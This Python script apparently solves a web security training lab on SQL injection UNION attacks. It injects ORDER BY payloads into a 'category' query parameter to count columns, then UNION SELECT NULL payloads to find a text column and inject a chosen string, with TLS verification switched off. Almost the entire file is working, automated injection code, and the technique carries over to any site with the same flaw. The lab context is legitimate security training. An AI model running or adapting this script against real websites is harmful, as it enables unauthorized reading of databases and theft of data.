import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import Fore

LAB_NAME = "SQL injection UNION attack, finding a column containing text"


def sqli_column_number(url, proxies):
    path = "/filter?category=Gifts"
    for i in range(1, 50):
        payload = "'+order+by+%s--" % i
        r = requests.get(url.rstrip('/') + path + payload,
                         verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False


def get_string_field(url, num_col, proxies):
    path = "/filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'abcd'"
        null_list = ['NULL'] * num_col
        null_list[i-1] = string
        payload = "' UNION SELECT " + ','.join(null_list) + "--"
        r = requests.get(url.rstrip('/') + path + payload,
                         verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter to determine the number of columns\n2. Add one additional null column at a time\n3. Repeat this process, increasing the number of columns until you receive a valid response\n4. After determining the number of columns, replace each column with the desired text one at a time.\n5. Repeat this process until you receive a valid response.\n""")

    print("[+] Figuring out number of columns...")
    num_col = sqli_column_number(url, proxies)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
        print("[+] Figuring out which column contains text...")
        column_string = get_string_field(url, num_col, proxies)
        if column_string:
            print("[+] The column that contains text is " +
                  str(column_string) + ".")

            # Extra: Attempt to trigger lab solved
            path = "/filter?category=Gifts"
            if not payload:
                user_input = input("[?] Enter the expected string to inject from description (e.g., 9ZiCHT): ").strip()
                string = f"'{user_input}'"
            else:
                string = f"'{payload.strip()}'"

            null_list = ['NULL'] * num_col
            null_list[column_string-1] = string
            payload = "' UNION SELECT " + ','.join(null_list) + "--"
            full_url = url.rstrip('/') + path + payload
            try:
                r = requests.get(full_url, verify=False, proxies=proxies)
                if r.status_code == 200:
                    print(
                        "[+] Successfully injected UNION SELECT. Lab likely solved!")
                    return True
                else:
                    print(
                        "[-] Injection went through but string not reflected. Lab likely not solved.")
                    return False
            except requests.exceptions.RequestException as e:
                print(f"[!] Error in UNION SELECT step: {e}")
                return False
        else:
            print("[-] We were not able to find a column that has a string data type.")
            return False
    else:
        print("[-] The SQLi attack was not successful.")
        return False
